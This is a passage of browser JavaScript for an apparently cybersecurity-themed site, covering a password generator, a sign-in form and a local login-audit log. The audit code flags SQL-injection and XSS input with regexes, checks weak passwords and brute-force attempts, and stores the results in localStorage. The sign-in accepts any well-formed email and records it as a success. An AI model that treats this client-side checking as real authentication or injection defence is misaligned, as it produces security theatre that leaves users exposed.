    if (document.getElementById('pw-lower').checked) charset += 'abcdefghijklmnopqrstuvwxyz';
    if (document.getElementById('pw-numbers').checked) charset += '0123456789';
    if (document.getElementById('pw-symbols').checked) charset += '!@#$%^&*()_+-=[]{}|;:,.<>?';
    if (!charset) { pwOutput.textContent = 'Select at least one type'; return; }
    const arr = new Uint32Array(len);
    crypto.getRandomValues(arr);
    let pw = '';
    for (let i = 0; i < len; i++) pw += charset[arr[i] % charset.length];
    pwOutput.textContent = pw;
  });
  if (pwCopyBtn && pwOutput) {
    pwCopyBtn.addEventListener('click', () => { if (pwOutput.textContent) copyText(pwOutput.textContent); });
  }

  // ═══════════════════════════════════════════════════
  // Auth Form & Security Audit Logging
  // ═══════════════════════════════════════════════════
  const authForm = document.getElementById('auth-form');
  const authTitle = document.getElementById('auth-title');
  const authNameField = document.getElementById('auth-name-field');
  const authToggle = document.getElementById('auth-toggle');
  let isSignup = false;

  const WEAK_PASSWORDS = ['123456', 'password', 'admin', 'admin123', 'root', 'qwerty', 'letmein', '12345678', 'pass123'];

  function analyzeLoginAttempt(email, password, name) {
    const flags = [];
    const combined = `${email} ${name || ''}`;

    if (/('\s*(or|and)\s+['"\d]|--|\bunion\b.*\bselect\b|;\s*drop\b)/i.test(combined) || /('\s*(or|and)\s+['"\d]|--|\bunion\b.*\bselect\b)/i.test(password)) {
      flags.push('SQLi Pattern');
    }
    if (/(<\s*script|javascript:|onerror\s*=|onload\s*=)/i.test(combined)) {
      flags.push('XSS Payload');
    }
    if (!password || password.length < 6 || WEAK_PASSWORDS.includes(password.toLowerCase())) {
      flags.push('Weak Password');
    }
    if (/^(admin|root|sysadmin|superuser|administrator)@/i.test(email)) {
      flags.push('Privileged ID Target');
    }

    // Check recent attempts from same email in last 2 minutes
    let logs = [];
    try { logs = JSON.parse(localStorage.getItem('login_audit_logs') || '[]'); } catch (e) {}
    const twoMinsAgo = Date.now() - 2 * 60 * 1000;
    const recentSameId = logs.filter(l => l.email === email && new Date(l.timestamp).getTime() > twoMinsAgo);
    if (recentSameId.length >= 2) {
      flags.push('Rapid / Brute-Force Pattern');
    }

    let risk = 'LOW';
    if (flags.includes('SQLi Pattern') || flags.includes('XSS Payload')) {
      risk = 'CRITICAL';
    } else if (flags.includes('Rapid / Brute-Force Pattern') || flags.includes('Privileged ID Target')) {
      risk = 'HIGH';
    } else if (flags.includes('Weak Password')) {
      risk = 'MEDIUM';
    }

    return { flags, risk };
  }

  function recordLoginAudit(entry) {
    let logs = [];
    try { logs = JSON.parse(localStorage.getItem('login_audit_logs') || '[]'); } catch (e) {}
    logs.unshift({
      id: 'LOG-' + Date.now().toString(36).toUpperCase(),
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      ...entry
    });
    // Keep latest 200 entries
    localStorage.setItem('login_audit_logs', JSON.stringify(logs.slice(0, 200)));
  }

  if (authToggle) authToggle.addEventListener('click', () => {
    isSignup = !isSignup;
    if (authTitle) authTitle.textContent = isSignup ? 'Create Account' : 'Sign In';
    if (authNameField) authNameField.classList.toggle('hidden', !isSignup);
    if (authToggle) authToggle.textContent = isSignup ? '← Back to Sign In' : 'New here? Create free account →';
  });

  if (authForm) authForm.addEventListener('submit', e => {
    e.preventDefault();
    const email = (document.getElementById('auth-email').value || '').trim();
    const password = document.getElementById('auth-password').value || '';
    const fullName = (document.getElementById('auth-name')?.value || '').trim();
    const username = email.includes('@') ? email.split('@')[0] : email;

    let blocked = [];
    try { blocked = JSON.parse(localStorage.getItem('blocked_accounts') || '[]'); } catch (e) {}

    if (blocked.includes(email.toLowerCase())) {
      recordLoginAudit({
        email,
        username,
        action: isSignup ? 'SIGNUP' : 'SIGNIN',
        target: 'User Portal',
        status: 'BLOCKED',
        risk: 'CRITICAL',
        flags: ['Blocked Account']
      });
      showToast('Access denied: This ID has been blocked by Admin');
      return;
    }

    const { flags, risk } = analyzeLoginAttempt(email, password, fullName);

    if (flags.includes('SQLi Pattern') || flags.includes('XSS Payload')) {
      recordLoginAudit({
        email,
        username,
        action: isSignup ? 'SIGNUP' : 'SIGNIN',
        target: 'User Portal',
        status: 'FAILED',
        risk,
        flags
      });
      showToast('Security alert: Suspicious input blocked & logged');
      return;
    }

    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      recordLoginAudit({
        email,
        username,
        action: isSignup ? 'SIGNUP' : 'SIGNIN',
        target: 'User Portal',
        status: 'FAILED',
        risk: risk === 'LOW' ? 'MEDIUM' : risk,
        flags: [...flags, 'Malformed Email ID']
      });
      showToast('Please enter a valid email address');
      return;
    }

    recordLoginAudit({
      email,
      username,
      action: isSignup ? 'SIGNUP' : 'SIGNIN',
      target: 'User Portal',
      status: 'SUCCESS',
      risk,
      flags
    });

    localStorage.setItem('cyber_auth', JSON.stringify({ email, username }));
    // Update all auth button text elements
    document.querySelectorAll('#auth-btn-text, .auth-btn-text-mobile').forEach(el => {
      el.textContent = username;
    });
    showToast('Welcome, ' + username + '!');
    switchTab('tab-terminal');
  });

  // Restore auth state
  try {
    const auth = JSON.parse(localStorage.getItem('cyber_auth'));
    if (auth && auth.username) {
      document.querySelectorAll('#auth-btn-text, .auth-btn-text-mobile').forEach(el => {
        el.textContent = auth.username;
      });
    }
  } catch (e) {}

  // ═══════════════════════════════════════════════════
  // Init
  // ═══════════════════════════════════════════════════
  renderTools();
  renderRoadmapGrid();
})();
